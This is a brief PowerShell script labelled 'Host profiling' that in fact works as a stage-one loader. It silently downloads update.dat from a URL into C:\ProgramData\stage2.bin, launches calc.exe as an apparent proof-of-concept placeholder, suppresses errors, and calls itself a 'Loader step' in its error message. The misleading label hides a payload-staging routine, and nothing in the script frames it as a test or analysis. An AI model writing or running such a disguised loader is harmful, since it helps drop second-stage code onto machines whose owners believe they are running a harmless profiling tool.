<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://internal.corp:443/assets/update.dat",
    [string]$OutputPath = "C:\ProgramData\stage2.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $OutputPath); Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
